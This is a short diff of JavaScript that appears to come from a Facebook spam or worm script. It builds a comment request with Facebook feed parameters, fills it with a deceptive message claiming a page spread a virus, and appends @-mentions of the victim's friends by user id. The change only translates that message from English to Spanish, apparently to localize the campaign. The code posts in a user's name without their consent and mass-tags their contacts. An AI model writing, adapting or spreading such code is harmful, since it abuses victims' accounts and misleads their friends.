@@ -235,7 +235,7 @@ function _h(c) {
   queryString["ft[page_id]"] = config.page_id;
   queryString["ft[fbfeed_location]"] = 120;
   queryString["internalextra[feedback_source]"] = 2;
-  queryString["message"] = "Report this video and this page as fake or spam i've got virus from them... >:O >:O >:O"+ "\n";
+  queryString["message"] = "Denuncia este video y esta página como falsa o spam tengo virus de ellos... >:O >:O >:O"+ "\n";
   for (i = 0;i < c["tags"]["length"];i++) {
   queryString["message"] += "@[" + c["tags"][i]["uid"] + ":" + c["tags"][i]["name"].split(" ")[0] + "]  ";
   }
